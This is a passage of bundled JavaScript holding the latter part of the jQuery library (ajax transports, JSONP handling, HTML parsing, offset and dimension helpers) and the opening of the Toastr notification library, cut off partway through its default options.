					} catch ( e ) {

						// Rethrow post-completion exceptions
						if ( completed ) {
							throw e;
						}

						// Propagate others as results
						done( -1, e );
					}
				}

				// Callback for when everything is done
				function done( status, nativeStatusText, responses, headers ) {
					var isSuccess, success, error, response, modified,
						statusText = nativeStatusText;

					// Ignore repeat invocations
					if ( completed ) {
						return;
					}

					completed = true;

					// Clear timeout if it exists
					if ( timeoutTimer ) {
						window.clearTimeout( timeoutTimer );
					}

					// Dereference transport for early garbage collection
					// (no matter how long the jqXHR object will be used)
					transport = undefined;

					// Cache response headers
					responseHeadersString = headers || "";

					// Set readyState
					jqXHR.readyState = status > 0 ? 4 : 0;

					// Determine if successful
					isSuccess = status >= 200 && status < 300 || status === 304;

					// Get response data
					if ( responses ) {
						response = ajaxHandleResponses( s, jqXHR, responses );
					}

					// Use a noop converter for missing script but not if jsonp
					if ( !isSuccess &&
						jQuery.inArray( "script", s.dataTypes ) > -1 &&
						jQuery.inArray( "json", s.dataTypes ) < 0 ) {
						s.converters[ "text script" ] = function() {};
					}

					// Convert no matter what (that way responseXXX fields are always set)
					response = ajaxConvert( s, response, jqXHR, isSuccess );

					// If successful, handle type chaining
					if ( isSuccess ) {

						// Set the If-Modified-Since and/or If-None-Match header, if in ifModified mode.
						if ( s.ifModified ) {
							modified = jqXHR.getResponseHeader( "Last-Modified" );
							if ( modified ) {
								jQuery.lastModified[ cacheURL ] = modified;
							}
							modified = jqXHR.getResponseHeader( "etag" );
							if ( modified ) {
								jQuery.etag[ cacheURL ] = modified;
							}
						}

						// if no content
						if ( status === 204 || s.type === "HEAD" ) {
							statusText = "nocontent";

						// if not modified
						} else if ( status === 304 ) {
							statusText = "notmodified";

						// If we have data, let's convert it
						} else {
							statusText = response.state;
							success = response.data;
							error = response.error;
							isSuccess = !error;
						}
					} else {

						// Extract error from statusText and normalize for non-aborts
						error = statusText;
						if ( status || !statusText ) {
							statusText = "error";
							if ( status < 0 ) {
								status = 0;
							}
						}
					}

					// Set data for the fake xhr object
					jqXHR.status = status;
					jqXHR.statusText = ( nativeStatusText || statusText ) + "";

					// Success/Error
					if ( isSuccess ) {
						deferred.resolveWith( callbackContext, [ success, statusText, jqXHR ] );
					} else {
						deferred.rejectWith( callbackContext, [ jqXHR, statusText, error ] );
					}

					// Status-dependent callbacks
					jqXHR.statusCode( statusCode );
					statusCode = undefined;

					if ( fireGlobals ) {
						globalEventContext.trigger( isSuccess ? "ajaxSuccess" : "ajaxError",
							[ jqXHR, s, isSuccess ? success : error ] );
					}

					// Complete
					completeDeferred.fireWith( callbackContext, [ jqXHR, statusText ] );

					if ( fireGlobals ) {
						globalEventContext.trigger( "ajaxComplete", [ jqXHR, s ] );

						// Handle the global AJAX counter
						if ( !( --jQuery.active ) ) {
							jQuery.event.trigger( "ajaxStop" );
						}
					}
				}

				return jqXHR;
			},

			getJSON: function( url, data, callback ) {
				return jQuery.get( url, data, callback, "json" );
			},

			getScript: function( url, callback ) {
				return jQuery.get( url, undefined, callback, "script" );
			}
		} );

		jQuery.each( [ "get", "post" ], function( _i, method ) {
			jQuery[ method ] = function( url, data, callback, type ) {

				// Shift arguments if data argument was omitted
				if ( isFunction( data ) ) {
					type = type || callback;
					callback = data;
					data = undefined;
				}

				// The url can be an options object (which then must have .url)
				return jQuery.ajax( jQuery.extend( {
					url: url,
					type: method,
					dataType: type,
					data: data,
					success: callback
				}, jQuery.isPlainObject( url ) && url ) );
			};
		} );

		jQuery.ajaxPrefilter( function( s ) {
			var i;
			for ( i in s.headers ) {
				if ( i.toLowerCase() === "content-type" ) {
					s.contentType = s.headers[ i ] || "";
				}
			}
		} );


		jQuery._evalUrl = function( url, options, doc ) {
			return jQuery.ajax( {
				url: url,

				// Make this explicit, since user can override this through ajaxSetup (trac-11264)
				type: "GET",
				dataType: "script",
				cache: true,
				async: false,
				global: false,

				// Only evaluate the response if it is successful (gh-4126)
				// dataFilter is not invoked for failure responses, so using it instead
				// of the default converter is kludgy but it works.
				converters: {
					"text script": function() {}
				},
				dataFilter: function( response ) {
					jQuery.globalEval( response, options, doc );
				}
			} );
		};


		jQuery.fn.extend( {
			wrapAll: function( html ) {
				var wrap;

				if ( this[ 0 ] ) {
					if ( isFunction( html ) ) {
						html = html.call( this[ 0 ] );
					}

					// The elements to wrap the target around
					wrap = jQuery( html, this[ 0 ].ownerDocument ).eq( 0 ).clone( true );

					if ( this[ 0 ].parentNode ) {
						wrap.insertBefore( this[ 0 ] );
					}

					wrap.map( function() {
						var elem = this;

						while ( elem.firstElementChild ) {
							elem = elem.firstElementChild;
						}

						return elem;
					} ).append( this );
				}

				return this;
			},

			wrapInner: function( html ) {
				if ( isFunction( html ) ) {
					return this.each( function( i ) {
						jQuery( this ).wrapInner( html.call( this, i ) );
					} );
				}

				return this.each( function() {
					var self = jQuery( this ),
						contents = self.contents();

					if ( contents.length ) {
						contents.wrapAll( html );

					} else {
						self.append( html );
					}
				} );
			},

			wrap: function( html ) {
				var htmlIsFunction = isFunction( html );

				return this.each( function( i ) {
					jQuery( this ).wrapAll( htmlIsFunction ? html.call( this, i ) : html );
				} );
			},

			unwrap: function( selector ) {
				this.parent( selector ).not( "body" ).each( function() {
					jQuery( this ).replaceWith( this.childNodes );
				} );
				return this;
			}
		} );


		jQuery.expr.pseudos.hidden = function( elem ) {
			return !jQuery.expr.pseudos.visible( elem );
		};
		jQuery.expr.pseudos.visible = function( elem ) {
			return !!( elem.offsetWidth || elem.offsetHeight || elem.getClientRects().length );
		};




		jQuery.ajaxSettings.xhr = function() {
			try {
				return new window.XMLHttpRequest();
			} catch ( e ) {}
		};

		var xhrSuccessStatus = {

				// File protocol always yields status code 0, assume 200
				0: 200,

				// Support: IE <=9 only
				// trac-1450: sometimes IE returns 1223 when it should be 204
				1223: 204
			},
			xhrSupported = jQuery.ajaxSettings.xhr();

		support.cors = !!xhrSupported && ( "withCredentials" in xhrSupported );
		support.ajax = xhrSupported = !!xhrSupported;

		jQuery.ajaxTransport( function( options ) {
			var callback, errorCallback;

			// Cross domain only allowed if supported through XMLHttpRequest
			if ( support.cors || xhrSupported && !options.crossDomain ) {
				return {
					send: function( headers, complete ) {
						var i,
							xhr = options.xhr();

						xhr.open(
							options.type,
							options.url,
							options.async,
							options.username,
							options.password
						);

						// Apply custom fields if provided
						if ( options.xhrFields ) {
							for ( i in options.xhrFields ) {
								xhr[ i ] = options.xhrFields[ i ];
							}
						}

						// Override mime type if needed
						if ( options.mimeType && xhr.overrideMimeType ) {
							xhr.overrideMimeType( options.mimeType );
						}

						// X-Requested-With header
						// For cross-domain requests, seeing as conditions for a preflight are
						// akin to a jigsaw puzzle, we simply never set it to be sure.
						// (it can always be set on a per-request basis or even using ajaxSetup)
						// For same-domain requests, won't change header if already provided.
						if ( !options.crossDomain && !headers[ "X-Requested-With" ] ) {
							headers[ "X-Requested-With" ] = "XMLHttpRequest";
						}

						// Set headers
						for ( i in headers ) {
							xhr.setRequestHeader( i, headers[ i ] );
						}

						// Callback
						callback = function( type ) {
							return function() {
								if ( callback ) {
									callback = errorCallback = xhr.onload =
										xhr.onerror = xhr.onabort = xhr.ontimeout =
											xhr.onreadystatechange = null;

									if ( type === "abort" ) {
										xhr.abort();
									} else if ( type === "error" ) {

										// Support: IE <=9 only
										// On a manual native abort, IE9 throws
										// errors on any property access that is not readyState
										if ( typeof xhr.status !== "number" ) {
											complete( 0, "error" );
										} else {
											complete(

												// File: protocol always yields status 0; see trac-8605, trac-14207
												xhr.status,
												xhr.statusText
											);
										}
									} else {
										complete(
											xhrSuccessStatus[ xhr.status ] || xhr.status,
											xhr.statusText,

											// Support: IE <=9 only
											// IE9 has no XHR2 but throws on binary (trac-11426)
											// For XHR2 non-text, let the caller handle it (gh-2498)
											( xhr.responseType || "text" ) !== "text"  ||
											typeof xhr.responseText !== "string" ?
												{ binary: xhr.response } :
												{ text: xhr.responseText },
											xhr.getAllResponseHeaders()
										);
									}
								}
							};
						};

						// Listen to events
						xhr.onload = callback();
						errorCallback = xhr.onerror = xhr.ontimeout = callback( "error" );

						// Support: IE 9 only
						// Use onreadystatechange to replace onabort
						// to handle uncaught aborts
						if ( xhr.onabort !== undefined ) {
							xhr.onabort = errorCallback;
						} else {
							xhr.onreadystatechange = function() {

								// Check readyState before timeout as it changes
								if ( xhr.readyState === 4 ) {

									// Allow onerror to be called first,
									// but that will not handle a native abort
									// Also, save errorCallback to a variable
									// as xhr.onerror cannot be accessed
									window.setTimeout( function() {
										if ( callback ) {
											errorCallback();
										}
									} );
								}
							};
						}

						// Create the abort callback
						callback = callback( "abort" );

						try {

							// Do send the request (this may raise an exception)
							xhr.send( options.hasContent && options.data || null );
						} catch ( e ) {

							// trac-14683: Only rethrow if this hasn't been notified as an error yet
							if ( callback ) {
								throw e;
							}
						}
					},

					abort: function() {
						if ( callback ) {
							callback();
						}
					}
				};
			}
		} );




		// Prevent auto-execution of scripts when no explicit dataType was provided (See gh-2432)
		jQuery.ajaxPrefilter( function( s ) {
			if ( s.crossDomain ) {
				s.contents.script = false;
			}
		} );

		// Install script dataType
		jQuery.ajaxSetup( {
			accepts: {
				script: "text/javascript, application/javascript, " +
					"application/ecmascript, application/x-ecmascript"
			},
			contents: {
				script: /\b(?:java|ecma)script\b/
			},
			converters: {
				"text script": function( text ) {
					jQuery.globalEval( text );
					return text;
				}
			}
		} );

		// Handle cache's special case and crossDomain
		jQuery.ajaxPrefilter( "script", function( s ) {
			if ( s.cache === undefined ) {
				s.cache = false;
			}
			if ( s.crossDomain ) {
				s.type = "GET";
			}
		} );

		// Bind script tag hack transport
		jQuery.ajaxTransport( "script", function( s ) {

			// This transport only deals with cross domain or forced-by-attrs requests
			if ( s.crossDomain || s.scriptAttrs ) {
				var script, callback;
				return {
					send: function( _, complete ) {
						script = jQuery( "<script>" )
							.attr( s.scriptAttrs || {} )
							.prop( { charset: s.scriptCharset, src: s.url } )
							.on( "load error", callback = function( evt ) {
								script.remove();
								callback = null;
								if ( evt ) {
									complete( evt.type === "error" ? 404 : 200, evt.type );
								}
							} );

						// Use native DOM manipulation to avoid our domManip AJAX trickery
						document.head.appendChild( script[ 0 ] );
					},
					abort: function() {
						if ( callback ) {
							callback();
						}
					}
				};
			}
		} );




		var oldCallbacks = [],
			rjsonp = /(=)\?(?=&|$)|\?\?/;

		// Default jsonp settings
		jQuery.ajaxSetup( {
			jsonp: "callback",
			jsonpCallback: function() {
				var callback = oldCallbacks.pop() || ( jQuery.expando + "_" + ( nonce.guid++ ) );
				this[ callback ] = true;
				return callback;
			}
		} );

		// Detect, normalize options and install callbacks for jsonp requests
		jQuery.ajaxPrefilter( "json jsonp", function( s, originalSettings, jqXHR ) {

			var callbackName, overwritten, responseContainer,
				jsonProp = s.jsonp !== false && ( rjsonp.test( s.url ) ?
					"url" :
					typeof s.data === "string" &&
						( s.contentType || "" )
							.indexOf( "application/x-www-form-urlencoded" ) === 0 &&
						rjsonp.test( s.data ) && "data"
				);

			// Handle iff the expected data type is "jsonp" or we have a parameter to set
			if ( jsonProp || s.dataTypes[ 0 ] === "jsonp" ) {

				// Get callback name, remembering preexisting value associated with it
				callbackName = s.jsonpCallback = isFunction( s.jsonpCallback ) ?
					s.jsonpCallback() :
					s.jsonpCallback;

				// Insert callback into url or form data
				if ( jsonProp ) {
					s[ jsonProp ] = s[ jsonProp ].replace( rjsonp, "$1" + callbackName );
				} else if ( s.jsonp !== false ) {
					s.url += ( rquery.test( s.url ) ? "&" : "?" ) + s.jsonp + "=" + callbackName;
				}

				// Use data converter to retrieve json after script execution
				s.converters[ "script json" ] = function() {
					if ( !responseContainer ) {
						jQuery.error( callbackName + " was not called" );
					}
					return responseContainer[ 0 ];
				};

				// Force json dataType
				s.dataTypes[ 0 ] = "json";

				// Install callback
				overwritten = window[ callbackName ];
				window[ callbackName ] = function() {
					responseContainer = arguments;
				};

				// Clean-up function (fires after converters)
				jqXHR.always( function() {

					// If previous value didn't exist - remove it
					if ( overwritten === undefined ) {
						jQuery( window ).removeProp( callbackName );

					// Otherwise restore preexisting value
					} else {
						window[ callbackName ] = overwritten;
					}

					// Save back as free
					if ( s[ callbackName ] ) {

						// Make sure that re-using the options doesn't screw things around
						s.jsonpCallback = originalSettings.jsonpCallback;

						// Save the callback name for future use
						oldCallbacks.push( callbackName );
					}

					// Call if it was a function and we have a response
					if ( responseContainer && isFunction( overwritten ) ) {
						overwritten( responseContainer[ 0 ] );
					}

					responseContainer = overwritten = undefined;
				} );

				// Delegate to script
				return "script";
			}
		} );




		// Support: Safari 8 only
		// In Safari 8 documents created via document.implementation.createHTMLDocument
		// collapse sibling forms: the second one becomes a child of the first one.
		// Because of that, this security measure has to be disabled in Safari 8.
		// https://bugs.webkit.org/show_bug.cgi?id=137337
		support.createHTMLDocument = ( function() {
			var body = document.implementation.createHTMLDocument( "" ).body;
			body.innerHTML = "<form></form><form></form>";
			return body.childNodes.length === 2;
		} )();


		// Argument "data" should be string of html
		// context (optional): If specified, the fragment will be created in this context,
		// defaults to document
		// keepScripts (optional): If true, will include scripts passed in the html string
		jQuery.parseHTML = function( data, context, keepScripts ) {
			if ( typeof data !== "string" ) {
				return [];
			}
			if ( typeof context === "boolean" ) {
				keepScripts = context;
				context = false;
			}

			var base, parsed, scripts;

			if ( !context ) {

				// Stop scripts or inline event handlers from being executed immediately
				// by using document.implementation
				if ( support.createHTMLDocument ) {
					context = document.implementation.createHTMLDocument( "" );

					// Set the base href for the created document
					// so any parsed elements with URLs
					// are based on the document's URL (gh-2965)
					base = context.createElement( "base" );
					base.href = document.location.href;
					context.head.appendChild( base );
				} else {
					context = document;
				}
			}

			parsed = rsingleTag.exec( data );
			scripts = !keepScripts && [];

			// Single tag
			if ( parsed ) {
				return [ context.createElement( parsed[ 1 ] ) ];
			}

			parsed = buildFragment( [ data ], context, scripts );

			if ( scripts && scripts.length ) {
				jQuery( scripts ).remove();
			}

			return jQuery.merge( [], parsed.childNodes );
		};


		/**
		 * Load a url into a page
		 */
		jQuery.fn.load = function( url, params, callback ) {
			var selector, type, response,
				self = this,
				off = url.indexOf( " " );

			if ( off > -1 ) {
				selector = stripAndCollapse( url.slice( off ) );
				url = url.slice( 0, off );
			}

			// If it's a function
			if ( isFunction( params ) ) {

				// We assume that it's the callback
				callback = params;
				params = undefined;

			// Otherwise, build a param string
			} else if ( params && typeof params === "object" ) {
				type = "POST";
			}

			// If we have elements to modify, make the request
			if ( self.length > 0 ) {
				jQuery.ajax( {
					url: url,

					// If "type" variable is undefined, then "GET" method will be used.
					// Make value of this field explicit since
					// user can override it through ajaxSetup method
					type: type || "GET",
					dataType: "html",
					data: params
				} ).done( function( responseText ) {

					// Save response for use in complete callback
					response = arguments;

					self.html( selector ?

						// If a selector was specified, locate the right elements in a dummy div
						// Exclude scripts to avoid IE 'Permission Denied' errors
						jQuery( "<div>" ).append( jQuery.parseHTML( responseText ) ).find( selector ) :

						// Otherwise use the full result
						responseText );

				// If the request succeeds, this function gets "data", "status", "jqXHR"
				// but they are ignored because response was set above.
				// If it fails, this function gets "jqXHR", "status", "error"
				} ).always( callback && function( jqXHR, status ) {
					self.each( function() {
						callback.apply( this, response || [ jqXHR.responseText, status, jqXHR ] );
					} );
				} );
			}

			return this;
		};




		jQuery.expr.pseudos.animated = function( elem ) {
			return jQuery.grep( jQuery.timers, function( fn ) {
				return elem === fn.elem;
			} ).length;
		};




		jQuery.offset = {
			setOffset: function( elem, options, i ) {
				var curPosition, curLeft, curCSSTop, curTop, curOffset, curCSSLeft, calculatePosition,
					position = jQuery.css( elem, "position" ),
					curElem = jQuery( elem ),
					props = {};

				// Set position first, in-case top/left are set even on static elem
				if ( position === "static" ) {
					elem.style.position = "relative";
				}

				curOffset = curElem.offset();
				curCSSTop = jQuery.css( elem, "top" );
				curCSSLeft = jQuery.css( elem, "left" );
				calculatePosition = ( position === "absolute" || position === "fixed" ) &&
					( curCSSTop + curCSSLeft ).indexOf( "auto" ) > -1;

				// Need to be able to calculate position if either
				// top or left is auto and position is either absolute or fixed
				if ( calculatePosition ) {
					curPosition = curElem.position();
					curTop = curPosition.top;
					curLeft = curPosition.left;

				} else {
					curTop = parseFloat( curCSSTop ) || 0;
					curLeft = parseFloat( curCSSLeft ) || 0;
				}

				if ( isFunction( options ) ) {

					// Use jQuery.extend here to allow modification of coordinates argument (gh-1848)
					options = options.call( elem, i, jQuery.extend( {}, curOffset ) );
				}

				if ( options.top != null ) {
					props.top = ( options.top - curOffset.top ) + curTop;
				}
				if ( options.left != null ) {
					props.left = ( options.left - curOffset.left ) + curLeft;
				}

				if ( "using" in options ) {
					options.using.call( elem, props );

				} else {
					curElem.css( props );
				}
			}
		};

		jQuery.fn.extend( {

			// offset() relates an element's border box to the document origin
			offset: function( options ) {

				// Preserve chaining for setter
				if ( arguments.length ) {
					return options === undefined ?
						this :
						this.each( function( i ) {
							jQuery.offset.setOffset( this, options, i );
						} );
				}

				var rect, win,
					elem = this[ 0 ];

				if ( !elem ) {
					return;
				}

				// Return zeros for disconnected and hidden (display: none) elements (gh-2310)
				// Support: IE <=11 only
				// Running getBoundingClientRect on a
				// disconnected node in IE throws an error
				if ( !elem.getClientRects().length ) {
					return { top: 0, left: 0 };
				}

				// Get document-relative position by adding viewport scroll to viewport-relative gBCR
				rect = elem.getBoundingClientRect();
				win = elem.ownerDocument.defaultView;
				return {
					top: rect.top + win.pageYOffset,
					left: rect.left + win.pageXOffset
				};
			},

			// position() relates an element's margin box to its offset parent's padding box
			// This corresponds to the behavior of CSS absolute positioning
			position: function() {
				if ( !this[ 0 ] ) {
					return;
				}

				var offsetParent, offset, doc,
					elem = this[ 0 ],
					parentOffset = { top: 0, left: 0 };

				// position:fixed elements are offset from the viewport, which itself always has zero offset
				if ( jQuery.css( elem, "position" ) === "fixed" ) {

					// Assume position:fixed implies availability of getBoundingClientRect
					offset = elem.getBoundingClientRect();

				} else {
					offset = this.offset();

					// Account for the *real* offset parent, which can be the document or its root element
					// when a statically positioned element is identified
					doc = elem.ownerDocument;
					offsetParent = elem.offsetParent || doc.documentElement;
					while ( offsetParent &&
						( offsetParent === doc.body || offsetParent === doc.documentElement ) &&
						jQuery.css( offsetParent, "position" ) === "static" ) {

						offsetParent = offsetParent.parentNode;
					}
					if ( offsetParent && offsetParent !== elem && offsetParent.nodeType === 1 ) {

						// Incorporate borders into its offset, since they are outside its content origin
						parentOffset = jQuery( offsetParent ).offset();
						parentOffset.top += jQuery.css( offsetParent, "borderTopWidth", true );
						parentOffset.left += jQuery.css( offsetParent, "borderLeftWidth", true );
					}
				}

				// Subtract parent offsets and element margins
				return {
					top: offset.top - parentOffset.top - jQuery.css( elem, "marginTop", true ),
					left: offset.left - parentOffset.left - jQuery.css( elem, "marginLeft", true )
				};
			},

			// This method will return documentElement in the following cases:
			// 1) For the element inside the iframe without offsetParent, this method will return
			//    documentElement of the parent window
			// 2) For the hidden or detached element
			// 3) For body or html element, i.e. in case of the html node - it will return itself
			//
			// but those exceptions were never presented as a real life use-cases
			// and might be considered as more preferable results.
			//
			// This logic, however, is not guaranteed and can change at any point in the future
			offsetParent: function() {
				return this.map( function() {
					var offsetParent = this.offsetParent;

					while ( offsetParent && jQuery.css( offsetParent, "position" ) === "static" ) {
						offsetParent = offsetParent.offsetParent;
					}

					return offsetParent || documentElement;
				} );
			}
		} );

		// Create scrollLeft and scrollTop methods
		jQuery.each( { scrollLeft: "pageXOffset", scrollTop: "pageYOffset" }, function( method, prop ) {
			var top = "pageYOffset" === prop;

			jQuery.fn[ method ] = function( val ) {
				return access( this, function( elem, method, val ) {

					// Coalesce documents and windows
					var win;
					if ( isWindow( elem ) ) {
						win = elem;
					} else if ( elem.nodeType === 9 ) {
						win = elem.defaultView;
					}

					if ( val === undefined ) {
						return win ? win[ prop ] : elem[ method ];
					}

					if ( win ) {
						win.scrollTo(
							!top ? val : win.pageXOffset,
							top ? val : win.pageYOffset
						);

					} else {
						elem[ method ] = val;
					}
				}, method, val, arguments.length );
			};
		} );

		// Support: Safari <=7 - 9.1, Chrome <=37 - 49
		// Add the top/left cssHooks using jQuery.fn.position
		// Webkit bug: https://bugs.webkit.org/show_bug.cgi?id=29084
		// Blink bug: https://bugs.chromium.org/p/chromium/issues/detail?id=589347
		// getComputedStyle returns percent when specified for top/left/bottom/right;
		// rather than make the css module depend on the offset module, just check for it here
		jQuery.each( [ "top", "left" ], function( _i, prop ) {
			jQuery.cssHooks[ prop ] = addGetHookIf( support.pixelPosition,
				function( elem, computed ) {
					if ( computed ) {
						computed = curCSS( elem, prop );

						// If curCSS returns percentage, fallback to offset
						return rnumnonpx.test( computed ) ?
							jQuery( elem ).position()[ prop ] + "px" :
							computed;
					}
				}
			);
		} );


		// Create innerHeight, innerWidth, height, width, outerHeight and outerWidth methods
		jQuery.each( { Height: "height", Width: "width" }, function( name, type ) {
			jQuery.each( {
				padding: "inner" + name,
				content: type,
				"": "outer" + name
			}, function( defaultExtra, funcName ) {

				// Margin is only for outerHeight, outerWidth
				jQuery.fn[ funcName ] = function( margin, value ) {
					var chainable = arguments.length && ( defaultExtra || typeof margin !== "boolean" ),
						extra = defaultExtra || ( margin === true || value === true ? "margin" : "border" );

					return access( this, function( elem, type, value ) {
						var doc;

						if ( isWindow( elem ) ) {

							// $( window ).outerWidth/Height return w/h including scrollbars (gh-1729)
							return funcName.indexOf( "outer" ) === 0 ?
								elem[ "inner" + name ] :
								elem.document.documentElement[ "client" + name ];
						}

						// Get document width or height
						if ( elem.nodeType === 9 ) {
							doc = elem.documentElement;

							// Either scroll[Width/Height] or offset[Width/Height] or client[Width/Height],
							// whichever is greatest
							return Math.max(
								elem.body[ "scroll" + name ], doc[ "scroll" + name ],
								elem.body[ "offset" + name ], doc[ "offset" + name ],
								doc[ "client" + name ]
							);
						}

						return value === undefined ?

							// Get width or height on the element, requesting but not forcing parseFloat
							jQuery.css( elem, type, extra ) :

							// Set width or height on the element
							jQuery.style( elem, type, value, extra );
					}, type, chainable ? margin : undefined, chainable );
				};
			} );
		} );


		jQuery.each( [
			"ajaxStart",
			"ajaxStop",
			"ajaxComplete",
			"ajaxError",
			"ajaxSuccess",
			"ajaxSend"
		], function( _i, type ) {
			jQuery.fn[ type ] = function( fn ) {
				return this.on( type, fn );
			};
		} );




		jQuery.fn.extend( {

			bind: function( types, data, fn ) {
				return this.on( types, null, data, fn );
			},
			unbind: function( types, fn ) {
				return this.off( types, null, fn );
			},

			delegate: function( selector, types, data, fn ) {
				return this.on( types, selector, data, fn );
			},
			undelegate: function( selector, types, fn ) {

				// ( namespace ) or ( selector, types [, fn] )
				return arguments.length === 1 ?
					this.off( selector, "**" ) :
					this.off( types, selector || "**", fn );
			},

			hover: function( fnOver, fnOut ) {
				return this
					.on( "mouseenter", fnOver )
					.on( "mouseleave", fnOut || fnOver );
			}
		} );

		jQuery.each(
			( "blur focus focusin focusout resize scroll click dblclick " +
			"mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave " +
			"change select submit keydown keypress keyup contextmenu" ).split( " " ),
			function( _i, name ) {

				// Handle event binding
				jQuery.fn[ name ] = function( data, fn ) {
					return arguments.length > 0 ?
						this.on( name, null, data, fn ) :
						this.trigger( name );
				};
			}
		);




		// Support: Android <=4.0 only
		// Make sure we trim BOM and NBSP
		// Require that the "whitespace run" starts from a non-whitespace
		// to avoid O(N^2) behavior when the engine would try matching "\s+$" at each space position.
		var rtrim = /^[\s\uFEFF\xA0]+|([^\s\uFEFF\xA0])[\s\uFEFF\xA0]+$/g;

		// Bind a function to a context, optionally partially applying any
		// arguments.
		// jQuery.proxy is deprecated to promote standards (specifically Function#bind)
		// However, it is not slated for removal any time soon
		jQuery.proxy = function( fn, context ) {
			var tmp, args, proxy;

			if ( typeof context === "string" ) {
				tmp = fn[ context ];
				context = fn;
				fn = tmp;
			}

			// Quick check to determine if target is callable, in the spec
			// this throws a TypeError, but we will just return undefined.
			if ( !isFunction( fn ) ) {
				return undefined;
			}

			// Simulated bind
			args = slice.call( arguments, 2 );
			proxy = function() {
				return fn.apply( context || this, args.concat( slice.call( arguments ) ) );
			};

			// Set the guid of unique handler to the same of original handler, so it can be removed
			proxy.guid = fn.guid = fn.guid || jQuery.guid++;

			return proxy;
		};

		jQuery.holdReady = function( hold ) {
			if ( hold ) {
				jQuery.readyWait++;
			} else {
				jQuery.ready( true );
			}
		};
		jQuery.isArray = Array.isArray;
		jQuery.parseJSON = JSON.parse;
		jQuery.nodeName = nodeName;
		jQuery.isFunction = isFunction;
		jQuery.isWindow = isWindow;
		jQuery.camelCase = camelCase;
		jQuery.type = toType;

		jQuery.now = Date.now;

		jQuery.isNumeric = function( obj ) {

			// As of jQuery 3.0, isNumeric is limited to
			// strings and numbers (primitives or objects)
			// that can be coerced to finite numbers (gh-2662)
			var type = jQuery.type( obj );
			return ( type === "number" || type === "string" ) &&

				// parseFloat NaNs numeric-cast false positives ("")
				// ...but misinterprets leading-number strings, particularly hex literals ("0x...")
				// subtraction forces infinities to NaN
				!isNaN( obj - parseFloat( obj ) );
		};

		jQuery.trim = function( text ) {
			return text == null ?
				"" :
				( text + "" ).replace( rtrim, "$1" );
		};




		var

			// Map over jQuery in case of overwrite
			_jQuery = window.jQuery,

			// Map over the $ in case of overwrite
			_$ = window.$;

		jQuery.noConflict = function( deep ) {
			if ( window.$ === jQuery ) {
				window.$ = _$;
			}

			if ( deep && window.jQuery === jQuery ) {
				window.jQuery = _jQuery;
			}

			return jQuery;
		};

		// Expose jQuery and $ identifiers, even in AMD
		// (trac-7102#comment:10, https://github.com/jquery/jquery/pull/557)
		// and CommonJS for browser emulators (trac-13566)
		if ( typeof noGlobal === "undefined" ) {
			window.jQuery = window.$ = jQuery;
		}




		return jQuery;
		} ); 
	} (jquery));
	return jquery.exports;
}

/*
 * Toastr
 * Copyright 2012-2015
 * Authors: John Papa, Hans Fjällemark, and Tim Ferrell.
 * All Rights Reserved.
 * Use, reproduction, distribution, and modification of this code is subject to the terms and
 * conditions of the MIT license, available at http://www.opensource.org/licenses/mit-license.php
 *
 * ARIA Support: Greta Krafsig
 *
 * Project: https://github.com/CodeSeven/toastr
 */

(function (module) {
	/* global define */
	(function (define) {
	    define(['jquery'], function ($) {
	        return (function () {
	            var $container;
	            var listener;
	            var toastId = 0;
	            var toastType = {
	                error: 'error',
	                info: 'info',
	                success: 'success',
	                warning: 'warning'
	            };

	            var toastr = {
	                clear: clear,
	                remove: remove,
	                error: error,
	                getContainer: getContainer,
	                info: info,
	                options: {},
	                subscribe: subscribe,
	                success: success,
	                version: '2.1.4',
	                warning: warning
	            };

	            var previousToast;

	            return toastr;

	            ////////////////

	            function error(message, title, optionsOverride) {
	                return notify({
	                    type: toastType.error,
	                    iconClass: getOptions().iconClasses.error,
	                    message: message,
	                    optionsOverride: optionsOverride,
	                    title: title
	                });
	            }

	            function getContainer(options, create) {
	                if (!options) { options = getOptions(); }
	                $container = $('#' + options.containerId);
	                if ($container.length) {
	                    return $container;
	                }
	                if (create) {
	                    $container = createContainer(options);
	                }
	                return $container;
	            }

	            function info(message, title, optionsOverride) {
	                return notify({
	                    type: toastType.info,
	                    iconClass: getOptions().iconClasses.info,
	                    message: message,
	                    optionsOverride: optionsOverride,
	                    title: title
	                });
	            }

	            function subscribe(callback) {
	                listener = callback;
	            }

	            function success(message, title, optionsOverride) {
	                return notify({
	                    type: toastType.success,
	                    iconClass: getOptions().iconClasses.success,
	                    message: message,
	                    optionsOverride: optionsOverride,
	                    title: title
	                });
	            }

	            function warning(message, title, optionsOverride) {
	                return notify({
	                    type: toastType.warning,
	                    iconClass: getOptions().iconClasses.warning,
	                    message: message,
	                    optionsOverride: optionsOverride,
	                    title: title
	                });
	            }

	            function clear($toastElement, clearOptions) {
	                var options = getOptions();
	                if (!$container) { getContainer(options); }
	                if (!clearToast($toastElement, options, clearOptions)) {
	                    clearContainer(options);
	                }
	            }

	            function remove($toastElement) {
	                var options = getOptions();
	                if (!$container) { getContainer(options); }
	                if ($toastElement && $(':focus', $toastElement).length === 0) {
	                    removeToast($toastElement);
	                    return;
	                }
	                if ($container.children().length) {
	                    $container.remove();
	                }
	            }

	            // internal functions

	            function clearContainer (options) {
	                var toastsToClear = $container.children();
	                for (var i = toastsToClear.length - 1; i >= 0; i--) {
	                    clearToast($(toastsToClear[i]), options);
	                }
	            }

	            function clearToast ($toastElement, options, clearOptions) {
	                var force = clearOptions && clearOptions.force ? clearOptions.force : false;
	                if ($toastElement && (force || $(':focus', $toastElement).length === 0)) {
	                    $toastElement[options.hideMethod]({
	                        duration: options.hideDuration,
	                        easing: options.hideEasing,
	                        complete: function () { removeToast($toastElement); }
	                    });
	                    return true;
	                }
	                return false;
	            }

	            function createContainer(options) {
	                $container = $('<div/>')
	                    .attr('id', options.containerId)
	                    .addClass(options.positionClass);

	                $container.appendTo($(options.target));
	                return $container;
	            }

	            function getDefaults() {
	                return {
	                    tapToDismiss: true,
	                    toastClass: 'toast',
	                    containerId: 'toast-container',
	                    debug: false,

	                    showMethod: 'fadeIn', //fadeIn, slideDown, and show are built into jQuery
	                    showDuration: 300,
	                    showEasing: 'swing', //swing and linear are built into jQuery
	                    onShown: undefined,
	                    hideMethod: 'fadeOut',
	                    hideDuration: 1000,
	                    hideEasing: 'swing',
	                    onHidden: undefined,
	                    closeMethod: false,
	                    closeDuration: false,
	                    closeEasing: false,
	                    closeOnHover: true,

	                    extendedTimeOut: 1000,
	                    iconClasses: {
	                        error: 'toast-error',
	                        info: 'toast-info',
	                        success: 'toast-success',
	                        warning: 'toast-warning'
	                    },
	                    iconClass: 'toast-info',
	                    positionClass: 'toast-top-right',
	                    timeOut: 5000, // Set timeOut and extendedTimeOut to 0 to make it sticky
